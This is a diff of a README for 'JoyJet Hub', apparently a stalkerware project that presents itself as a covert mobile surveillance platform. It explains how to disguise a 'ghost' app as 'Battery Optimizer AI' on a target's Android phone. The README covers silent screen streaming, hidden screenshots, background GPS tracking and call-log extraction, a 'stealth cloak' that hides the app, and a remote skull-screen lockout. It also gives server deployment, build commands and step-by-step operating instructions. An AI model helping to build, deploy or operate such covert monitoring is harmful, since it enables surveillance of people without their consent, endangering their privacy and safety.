@@ -1,18 +1,23 @@
 <div align="center">
 
+<img src="https://img.shields.io/badge/☣-JOYJET%20HUB-FF0040?style=for-the-badge&labelColor=0A0A0A&color=FF0040" alt="JoyJet Hub" height="40"/>
+
 # ☣ JOYJET HUB
 
 **Master Surveillance & Command Platform**  
 *Real-time node monitoring · HD screen streaming · Tactical GPS · Covert telemetry*
 
-[![Build APK](https://github.com/guru9/joyjet-hub/actions/workflows/build.yml/badge.svg)](https://github.com/guru9/joyjet-hub/actions)
-[![React Native](https://img.shields.io/badge/React%20Native-0.83-61DAFB?logo=react)](https://reactnative.dev)
-[![Expo](https://img.shields.io/badge/Expo-55-000020?logo=expo)](https://expo.dev)
-[![Socket.IO](https://img.shields.io/badge/Socket.IO-4.8-010101?logo=socket.io)](https://socket.io)
-[![Android](https://img.shields.io/badge/Android-API%2030%2B-3DDC84?logo=android)](https://developer.android.com)
-[![License: ISC](https://img.shields.io/badge/License-ISC-blue)](./LICENSE)
+[![Build APK](https://github.com/guru9/joyjet-hub/actions/workflows/android-build.yml/badge.svg)](https://github.com/guru9/joyjet-hub/actions)
+[![React Native](https://img.shields.io/badge/React%20Native-0.83-61DAFB?style=flat-square&logo=react&logoColor=61DAFB)](https://reactnative.dev)
+[![Expo](https://img.shields.io/badge/Expo-55-000020?style=flat-square&logo=expo&logoColor=white)](https://expo.dev)
+[![Socket.IO](https://img.shields.io/badge/Socket.IO-4.8-010101?style=flat-square&logo=socket.io)](https://socket.io)
+[![WebRTC](https://img.shields.io/badge/WebRTC-124-333333?style=flat-square&logo=webrtc)](https://webrtc.org)
+[![Android](https://img.shields.io/badge/Android-API%2030%2B-3DDC84?style=flat-square&logo=android&logoColor=white)](https://developer.android.com)
+[![Kotlin](https://img.shields.io/badge/Kotlin-2.1.20-7F52FF?style=flat-square&logo=kotlin&logoColor=white)](https://kotlinlang.org)
+[![Node.js](https://img.shields.io/badge/Node.js-20%2B-339933?style=flat-square&logo=nodedotjs&logoColor=white)](https://nodejs.org)
+[![License: ISC](https://img.shields.io/badge/License-ISC-blue?style=flat-square)](./LICENSE)
 
-[📥 Download Latest APK](https://github.com/guru9/joyjet-hub/releases/latest/download/app-release.apk) · [📘 Full Feature Manual](./FEATURES.md) · [🖥️ Server Repo](https://github.com/guru9/joyjet-server)
+[📥 Download Latest APK](https://github.com/guru9/joyjet-hub/releases/latest/download/app-release.apk) · [📘 Full Feature Manual](./FEATURES.md) · [🖥️ Server Repo](https://github.com/guru9/joyjet-server) · [📋 Feature Registry](./FEATURE.md)
 
 </div>
 
@@ -20,9 +25,9 @@
 
 ## 🔍 What is JoyJet?
 
-JoyJet is a **covert mobile surveillance platform** built in React Native. It provides a centralized Admin command center to monitor, control, and extract intelligence from remote ghost nodes — all in real-time over an encrypted WebSocket + WebRTC connection.
+JoyJet is a **covert mobile surveillance platform** built in React Native + Expo. It provides a centralized Admin command center to monitor, control, and extract intelligence from remote ghost nodes — all in real-time over an **encrypted WebSocket + WebRTC** connection.
 
-> **Disguise**: Ghost nodes appear as "Battery Optimizer AI" on the target device.
+> 🎭 **Disguise**: Ghost nodes appear as **"Battery Optimizer AI"** on the target device. The foreground service notification reads *"Monitoring hardware performance..."*
 
 ---
 
@@ -37,261 +42,188 @@ graph TD
     G <-->|WebRTC P2P — Encrypted Live Stream| V
     S -->|Relay Vitals + Commands| A
     S -->|Relay Vitals| V
+
+    style A fill:#FF204E,color:#fff,stroke:#FF204E
+    style S fill:#1E293B,color:#38BDF8,stroke:#38BDF8
+    style V fill:#0EA5E9,color:#fff,stroke:#0EA5E9
+    style G fill:#F59E0B,color:#000,stroke:#F59E0B
 ```
 
-### 3-Tier Authority Model
-| Role | Key Format | Capability |
-|---|---|---|
-| **Admin** | `admin` + PIN | Global: sees ALL nodes, issues all commands, Burn Protocol |
-| **Viewer** | alphanumeric ≥4 chars | Restricted: monitors their own ghost nodes only (max 3) |
-| **Ghost** | `prefix_suffix` | Runs silently on target device — streams screen + location |
+### 🎖️ 3-Tier Authority Model
+
+| 🔑 Role | Key Format | Capacity | Capabilities |
+|---|---|---|---|
+| 🔴 **Admin** | `admin` + PIN | Unlimited nodes | Global: all nodes, all commands, Burn Protocol |
+| 🔵 **Viewer** | alphanumeric ≥ 4 chars | Max 3 ghost nodes | Restricted: monitors their own ghost nodes only |
+| 🟡 **Ghost** | `prefix_suffix` | N/A | Silent: streams screen + location, receives commands |
 
 ---
 
-## 🎯 Main Features
+## ✨ Feature Suite
 
-### 📡 Live CCTV — Screen Sharing Stream
-> **Real-time HD video feed of the target device's screen**
+<table>
+<tr>
+<td width="50%">
 
-Uses **WebRTC peer-to-peer** technology to stream the ghost device's screen directly to the Admin dashboard. The video travels device-to-device — no data ever passes through or is stored on the server. The stream is end-to-end encrypted by WebRTC standard.
+### 📡 Live CCTV — Screen Streaming
+**WebRTC P2P** encrypted video feed from the ghost device  
+`480×854 @ 15fps` — WiFi, LTE, 5G  
+End-to-end encrypted · Zero server storage
 
-- Resolution: `480×854 @ 15fps` — optimized for mobile bandwidth
-- Works over WiFi, LTE, and 5G networks
-- Admin and Viewers can watch simultaneously (independent P2P connections)
-- Zero server storage — stream is live-only, not recorded
+### 📸 Silent Remote Snapshot
+One-tap JPEG capture via `captureScreen()`  
+Delivered in 2–3s · No sound/flash/notification  
+Auto-saved to `JOYJET_DOWNLOADS` album
 
----
-
-### 📸 Silent Screen Capture
-> **One-tap remote screenshot — invisible to the target**
-
-Admin issues a `SNAPSHOT` command that silently captures the ghost device's current screen using a native GPU buffer dump. The JPEG is base64-encoded and relayed through the server to the Admin's **Evidence Gallery** with zero notification or UI change on the target device.
-
-- High-quality JPEG capture (GPU buffer)
-- Delivered to Admin within 2–3 seconds
-- Stored in session gallery — downloadable to `JOYJET_DOWNLOADS` album
-- Silent: no camera sound, no screen flash, no notification
-
----
-
-### 🛰️ Live Pinpoint Location (GPS)
-> **Real-time tactical map tracking — works even when the screen is locked**
-
-A dual-layer location system keeps track of the ghost device at all times:
-
-| Mode | Method | When Active |
-|---|---|---|
-| **Foreground** | `getCurrentPositionAsync` (10m precision) | App is open |
-| **Background** | `startLocationUpdatesAsync` via OS TaskManager | Always — survives minimize & screen lock |
-
-- Updates every **15 seconds** or every **10 metres** of movement
-- Renders as a live pin on the Admin's **Tactical Map** tab
-- Works through cellular data when GPS is available
-- Fallback to last known position during Pause mode
-
----
+### 🛰️ Live GPS Tracking
+Dual-layer: foreground `getCurrentPositionAsync` + background `TaskManager`  
+Every **15s** / **10m** · Survives screen lock  
+Rendered on Admin's **Tactical Map** tab
 
 ### 📞 Call Log Intelligence
-> **Silent remote extraction of the target's call history**
+Silent pull of last 10 call records  
+Shows: name, number, INCOMING 🟢 / OUTGOING 🔵, timestamp  
+Auto-synced on first calibration
 
-The Admin can pull the last 10 call records from the target device's internal database with a single tap. Logs show caller name, phone number, call direction, and timestamp — all without any visible activity on the target.
+</td>
+<td width="50%">
 
-- Displays: caller name, number, INCOMING 🟢 / OUTGOING 🔵, date & time
-- Auto-synced on first calibration
-- Re-sync anytime from the **CALLS** tab
-- Data stays in Admin session memory (not persisted to server)
+### ☣ Burn Protocol — Permanent Destruction
+Long-press any node chip → confirm cyberpunk modal  
+Node purged from server registry forever  
+Ghost displays **💀 Skull Lockscreen** — cannot reconnect
 
----
-
-### 🔋 Live Battery & Vitals Monitoring
-> **Real-time device health dashboard for every connected node**
-
-The Admin's vitals grid shows live battery percentage, uplink status, and last-seen timestamp for the selected node. Battery updates are reported every 10 seconds and logged in the system console when they change by more than 5%.
-
----
-
-### ☣ Burn Protocol (Permanent Node Destruction)
-> **Long-press any node to permanently destroy it**
-
-The most powerful Admin command. Long-pressing a node chip triggers a cyberpunk confirmation modal. On confirmation:
-1. The server permanently removes the node from its registry
-2. The ghost app receives a DESTROY command and displays an irrecoverable **Skull Lockscreen**
-3. The node is gone forever — cannot reconnect without fresh credentials
-
----
-
-### 🚨 Remote Wipe
-> **Instantly disconnect and reset a ghost node**
-
-A soft kill-switch that forces the ghost app back to the login screen and closes all connections. Unlike Burn, the node stays in the registry and can reconnect. Used when a quick disconnect is needed without permanent deletion.
-
----
+### 🚨 Remote Wipe — Soft Kill Switch
+Forces ghost back to login screen instantly  
+Node stays in registry — can reconnect later  
+Useful for quick disconnect without deletion
 
 ### ⏸️ Covert Pause & Resume
-> **Put a node to sleep remotely — preserves ~80% battery**
-
-When a ghost node doesn't need active monitoring, Admin can remotely suspend its heavy sensors (WebRTC video + high-accuracy GPS) while keeping the socket alive. The node stays reachable and instantly reactivatable with a Resume tap.
-
----
+Suspend WebRTC + GPS remotely  
+Ghost socket stays alive — node stays reachable  
+~**80% battery saving** on target device
 
 ### 🃏 Stealth Cloak
-> **One tap hides the app — surveillance continues in background**
+Sends app to background (Home button equivalent)  
+GPS task + socket + heartbeat **remain fully active**  
+Target sees their normal home screen
 
-The Ghost screen has an **"ENGAGE STEALTH CLOAK"** button that sends the app to the background (like pressing the Home button) while keeping the GPS task, socket connection, and heartbeat fully active. The target sees their normal home screen.
+</td>
+</tr>
+</table>
 
----
+### Additional Features
 
-### 🔴🟠🟢 Traffic Light Status System
-> **Instant visual node health at a glance**
-
-Every node chip shows a real-time color state:
-- 🟢 **Green** — Fully active and transmitting
-- 🟠 **Orange** — Alive but paused / sensors sleeping
-- 🔴 **Red** — Offline / disconnected / burned
-
-Nodes are automatically marked offline after **120 seconds** of silence.
-
----
-
-### 🔐 Smart Key Validation
-> **Real-time format enforcement + live server prefix check**
-
-Keys are validated character-by-character as you type — special chars are blocked at the keyboard. The Login button stays **disabled** until the format is 100% valid. For Ghost keys, the app pings the server live to confirm the parent viewer is online before you even tap Login.
-
----
-
-### 📟 CyberAlert System
-> **Hacker-themed notifications replace all native OS popups**
-
-Every event — login failures, successful captures, burn confirmations — goes through a custom branded modal with color-coded scanline borders (`danger` = red, `success` = green, `warning` = amber, `info` = cyan).
-
----
-
-### 📂 Organised Evidence Gallery
-> **Named album storage for all captured intel**
-
-Downloaded snapshots and feed captures are saved to dedicated gallery albums on the Admin device:
-- `JOYJET_DOWNLOADS` — remote snapshot downloads
-- `JOYJET_SCREENSHOTS` — local live-feed captures  
-Filenames include the node name and timestamp for traceability.
+| Feature | Description |
+|---|---|
+| 🔴🟠🟢 **Traffic Light Status** | Green = active, Orange = paused, Red = offline. Auto-mark offline after 120s silence |
+| 🔐 **Smart Key Validation** | Real-time format enforcement + live server prefix check before login |
+| 📟 **CyberAlert System** | Custom hacker-themed modals replace all native OS popups |
+| 📂 **Evidence Gallery** | Named album storage — `JOYJET_DOWNLOADS` & `JOYJET_SCREENSHOTS` |
+| 🔋 **Live Battery & Vitals** | Battery %, uplink status, last-seen time updated every 10s |
+| 📊 **Tactical Grid Dashboard** | 2×2 grid: SECURE IDENTITY · ENERGY LEVEL · UPLINK STATUS · LAST TELEMETRY |
 
 ---
 
 ## 🔑 Access Key System
 
-Keys are validated in real-time — special characters are blocked at the keyboard; the Login button stays **disabled** until the format is fully correct.
-
 ```
-Admin  →  admin               (+ secure PIN)
-Viewer →  alphaname           (alphanumeric, min 4 chars)
-Ghost  →  alphaname_nodename  (prefix_suffix, each min 4 chars, alphanumeric only)
+┌─ Admin ──────────────────────────────────────────────────────┐
+│  Key: admin    (+) Secure PIN (set via ADMIN_SECRET_KEY env) │
+└──────────────────────────────────────────────────────────────┘
+┌─ Viewer ─────────────────────────────────────────────────────┐
+│  Key: alphanumeric, min 4 chars, NO underscore               │
+│  ✅ alpha   bravo99   echo01                                  │
+│  ❌ al (too short)   alpha-1 (hyphen)   my.viewer (dot)      │
+└──────────────────────────────────────────────────────────────┘
+┌─ Ghost ──────────────────────────────────────────────────────┐
+│  Key: PREFIX_SUFFIX  (each part: alphanumeric, min 4 chars)  │
+│  ✅ alpha_node1   admin_cam01   bravo_unit01                  │
+│  ❌ al_node1 (prefix short)   alpha_dev (suffix short)       │
+│  ❌ alpha_cam-1 (special char)   al_pha_dev1 (two _)         │
+└──────────────────────────────────────────────────────────────┘
 ```
 
-**Ghost prefix live-check**: After typing a valid prefix + `_`, the app instantly queries
-the server to confirm the parent viewer is online and shows a `✅ PREFIX VALID` or `✗ PREFIX NOT FOUND` badge.
+**Ghost prefix live-check**: After typing a valid prefix + `_`, the app instantly queries the server:
+- ✅ `PREFIX VALID` — parent viewer/admin is online → Login enabled
+- ✗ `PREFIX NOT FOUND` — no matching parent → Login blocked
 
 ---
 
 ## 🚀 Quick Start
 
-### 1. Set up the Server
+### 1. Deploy the Server
 ```bash
 git clone https://github.com/guru9/joyjet-server.git
 cd joyjet-server
 npm install
 
-# Create .env file
-echo "ADMIN_SECRET_KEY=yourSecretPin" > .env
-echo "PUBLIC_URL=https://your-server.onrender.com" >> .env
+# Configure environment
+cp .env.sample .env
+# Set ADMIN_SECRET_KEY=yourSecretPin and PUBLIC_URL in .env
 
 npm start
 ```
 
 ### 2. Install the App
-Download the APK from [Releases](https://github.com/guru9/joyjet-hub/releases/latest) and install on Android 11+ devices.
+Download APK from [Releases](https://github.com/guru9/joyjet-hub/releases/latest) and install on **Android 11+**
 
 Or build from source:
 ```bash
 git clone https://github.com/guru9/joyjet-hub.git
 cd joyjet-hub
-npm install
-npx expo run:android       # Dev build
+npm install --legacy-peer-deps
+npx expo prebuild -p android
+cd android && ./gradlew assembleRelease
 ```
 
 ### 3. Configure Server URL
-Edit `src/services/socket.js` and set your server URL:
+Edit `src/services/socket.js`:
 ```javascript
 const socket = io('https://your-server.onrender.com');
 ```
 
-### 4. Login & Operate
-| Step | Who | Action |
+### 4. Operational Login Guide
+
+| Step | Role | Action |
 |---|---|---|
-| 1 | Admin | Open app → key: `admin` → enter PIN → login |
-| 2 | Viewer | Open app → key: `alpha` → login |
-| 3 | Ghost | Open app on target → key: `alpha_phone1` → login → tap CALIBRATE → STEALTH CLOAK |
-| 4 | Admin | Select node → FEED/MAP/SNAPS/CALLS/LOGS tabs |
+| 1 | 🔴 Admin | Key: `admin` → PIN → **BOOT SYSTEM INTERFACE** |
+| 2 | 🔵 Viewer | Key: `alpha` → **BOOT SYSTEM INTERFACE** |
+| 3 | 🟡 Ghost | Key: `alpha_phone1` → Login → **CALIBRATE** → **STEALTH CLOAK** |
+| 4 | 🔴 Admin | Select node → FEED / MAP / SNAPS / CALLS / LOGS |
 
 ---
 
 ## 🛠️ Tech Stack
 
-### Client (This Repo)
-| Technology | Version | Purpose |
+### 📱 Client (This Repo)
+
+| Technology | Version | Role |
 |---|---|---|
-| **React Native** | 0.83 | Core mobile framework (New Architecture / JSI enabled) |
-| **Expo** | 55 | Managed modules: Battery, Location, TaskManager, MediaLibrary |
-| **react-native-webrtc** | 124 | P2P screen streaming with STUN NAT traversal |
-| **Socket.IO Client** | 4.8 | Real-time bidirectional command/telemetry channel |
-| **expo-location** | — | Foreground + background GPS with TaskManager integration |
-| **expo-battery** | — | Battery level and charging state monitoring |
-| **expo-media-library** | — | Evidence gallery album management |
-| **expo-file-system** | — | Local file handling for screenshots |
-| **react-native-view-shot** | — | Silent screen capture (snapshot command) |
-| **react-native-call-log** | — | Remote call history extraction |
+| **React Native** | 0.83 | Core mobile framework (New Architecture / JSI) |
+| **Expo** | 55 | Managed native modules ecosystem |
+| **react-native-webrtc** | 124 | P2P screen streaming — STUN NAT traversal |
+| **Socket.IO Client** | 4.8 | Real-time bidirectional command/telemetry |
+| **expo-location** | 55.1.x | Foreground + background GPS with TaskManager |
+| **expo-battery** | 55.x | Battery level & charging state monitoring |
+| **expo-media-library** | 55.x | Evidence gallery album management |
+| **expo-file-system** | 55.x | Local file I/O for screenshots |
+| **expo-screen-capture** | 55.x | Silent screen capture (snapshot command) |
+| **react-native-call-log** | 3.x | Remote call history extraction |
+| **react-native-maps** | 1.27.x | Tactical GPS map rendering |
 | **React Navigation** | 7 | Gesture-driven tab workspace |
 | **@expo/vector-icons** | — | MaterialCommunityIcons icon library |
+| **Kotlin** | 2.1.20 | Android native build language |
 
-### Server ([joyjet-server](https://github.com/guru9/joyjet-server))
-| Technology | Version | Purpose |
+### 🖥️ Server ([joyjet-server](https://github.com/guru9/joyjet-server))
+
+| Technology | Version | Role |
 |---|---|---|
 | **Node.js** | 20+ | Server runtime |
 | **Express** | 4 | HTTP server and health endpoint |
-| **Socket.IO** | 4.8 | WebSocket engine — auth, relay, commands |
+| **Socket.IO** | 4.8 | WebSocket engine: auth, relay, commands |
 | **fs (built-in)** | — | JSON-based node registry persistence |
-| **axios** | — | Server keep-alive heartbeat to Render.com |
-
----
-
-## 📁 Project Structure
-
-```
-joyjet-hub/
-├── src/
-│   ├── utils/
-│   │   ├── theme.js            ← Design system tokens (colors, radii, shadows)
-│   │   └── GlobalAlert.js      ← Global CyberAlert event emitter
-│   ├── services/
-│   │   └── socket.js           ← Socket.IO client singleton
-│   ├── components/
-│   │   ├── AppHeader.js        ← Branded JOYJET header
-│   │   ├── CyberAlertModal.js  ← Hacker-themed alert overlay
-│   │   ├── LogConsole.js       ← Terminal-style system log viewer
-│   │   ├── VideoFeed.js        ← WebRTC live stream renderer
-│   │   ├── TacticalMap.js      ← GPS map component
-│   │   ├── SnapshotGallery.js  ← Evidence image grid + download
-│   │   ├── CallLogViewer.js    ← Call history component
-│   │   └── StatusCard.js       ← Compact vitals bar
-│   └── screens/
-│       ├── LoginScreen.js      ← Smart auth gateway with live validation
-│       ├── AdminScreen.js      ← Full command center
-│       ├── GhostScreen.js      ← Stealth target node interface
-│       ├── ViewerScreen.js     ← Field monitor (prefix-restricted)
-│       └── GuideScreen.js      ← In-app operational manual
-├── FEATURES.md                 ← Complete technical & operational encyclopedia
-├── app.json                    ← Expo config (permissions, build settings)
-└── .github/workflows/          ← CI/CD GitHub Actions build pipeline
-```
+| **axios** | — | Server keep-alive heartbeat (Render.com) |
 
 ---
 
@@ -299,13 +231,14 @@ joyjet-hub/
 
 | Permission | Purpose |
 |---|---|
-| `ACCESS_FINE_LOCATION` | 10m-precision GPS tracking |
-| `ACCESS_BACKGROUND_LOCATION` | Background location task (survives screen lock) |
+| `ACCESS_FINE_LOCATION` | 10m-precision foreground GPS |
+| `ACCESS_BACKGROUND_LOCATION` | Background GPS (survives screen lock) |
 | `READ_CALL_LOG` | Remote call history extraction |
-| `READ_PHONE_STATE` | Device status and signal monitoring |
-| `FOREGROUND_SERVICE` + `FOREGROUND_SERVICE_LOCATION` | Background services |
+| `READ_PHONE_STATE` | Device status + signal monitoring |
+| `FOREGROUND_SERVICE` | Persistent background service |
+| `FOREGROUND_SERVICE_LOCATION` | Background location task |
 | `FOREGROUND_SERVICE_MEDIA_PROJECTION` | Screen capture stream |
-| `SYSTEM_ALERT_WINDOW` | Overlay permissions for stream |
+| `SYSTEM_ALERT_WINDOW` | Overlay for stream |
 | `CAMERA` + `RECORD_AUDIO` | WebRTC screen sharing prerequisites |
 | `RECEIVE_BOOT_COMPLETED` | Auto-restart background tasks after reboot |
 
@@ -313,16 +246,36 @@ joyjet-hub/
 
 ## ⚙️ Build & CI/CD
 
-Every push to `main` triggers a GitHub Actions workflow:
-1. Installs dependencies and Expo CLI
-2. Compiles native Java/C++ modules (WebRTC, location)
-3. Signs and packages `app-release.apk`
-4. Publishes APK to GitHub Releases
+Every push to `main` triggers the **GitHub Actions** build pipeline:
 
-**Hardware Requirements**:
-- Android API 30+ (Android 11 minimum)
-- 2GB+ RAM recommended for HD streaming
-- Active internet connection (WiFi or LTE/5G)
+```
+Push to main
+    │
+    ├─ 1. Checkout repository
+    ├─ 2. Setup Node 20 + Java 17 (Zulu)
+    ├─ 3. Cache Gradle packages (speeds up repeated builds)
+    ├─ 4. Install npm dependencies
+    ├─ 5. Auto-bump version (patch + versionCode)
+    ├─ 6. expo prebuild --clean (generate android/ native project)
+    ├─ 7. Patch Gradle HTTP timeouts (120s for JitPack)
+    ├─ 8. ./gradlew assembleRelease (3 auto-retries on network failure)
+    ├─ 9. Upload APK artifact
+    ├─ 10. Delete old "latest" release
+    ├─ 11. Deploy to rolling GitHub Release (permanent "latest" tag)
+    └─ 12. Commit version bump back to main [skip ci]
+```
+
+### Build Requirements
+- Android **API 30+** (Android 11 minimum)
+- NDK **27.1.12297006** (auto-installed by CI)
+- Gradle **9.0.0** · compileSdk **36** · targetSdk **35**
+- JVM **17** required for Gradle 9 compatibility
+
+### Known Build Fix (v4.2+)
+The `org.jitsi:webrtc:124.+` dependency resolves from **JitPack**, which can time out during high-traffic CI windows. Fixes applied:
+- `android/build.gradle`: Added `metadataSources { mavenPom(); artifact() }` to JitPack block
+- `android/gradle.properties`: `systemProp.org.gradle.internal.http.socketTimeout=120000`
+- **3-attempt retry loop** in CI with 30s/60s backoffs before failing the workflow
 
 ---
 
@@ -336,14 +289,35 @@ Every push to `main` triggers a GitHub Actions workflow:
 | Call logs | None | None | Session RAM |
 | Node registry | ✅ JSON file | — | — |
 
-The server is a **pure relay** — no media content is ever persisted to disk.
+> The server is a **pure relay** — no media content is ever persisted to disk.
+
+---
+
+## 🎨 Design System
+
+The app uses a centralized **OLED-safe dark theme** defined in `src/utils/theme.js`:
+
+| Token | Color | Usage |
+|---|---|---|
+| `bg` | `#0F172A` | Main background (deep navy) |
+| `surface` | `#1E293B` | Cards and panels |
+| `elevated` | `#0B0F19` | Modal overlays |
+| `border` | `#334155` | Standard borders |
+| `cyan` | `#38BDF8` | Primary accent — tabs, links |
+| `green` | `#10B981` | Active / Online / Success |
+| `amber` | `#F59E0B` | Paused / Warning / Ghost badge |
+| `red` | `#EF4444` | Offline / Danger / Burn |
+| `textPrimary` | `#F8FAFC` | Main readable text |
+| `textSecondary` | `#94A3B8` | Supporting labels |
 
 ---
 
 ## 📘 Documentation
 
-- **[FEATURES.md](./FEATURES.md)** — Complete 20-section technical & operational encyclopedia with "How to Use" for every feature
-- **[Server README](https://github.com/guru9/joyjet-server#readme)** — Server deployment, environment variables, and architecture
+- **[FEATURES.md](./FEATURES.md)** — Complete 20-section technical & operational encyclopedia (How-to for every feature)
+- **[FEATURE.md](./FEATURE.md)** — Concise feature registry with quick-reference summaries
+- **[CHANGELOG.md](./CHANGELOG.md)** — Version history and release notes
+- **[Server README](https://github.com/guru9/joyjet-server#readme)** — Server deployment, env vars, architecture
 
 ---
 
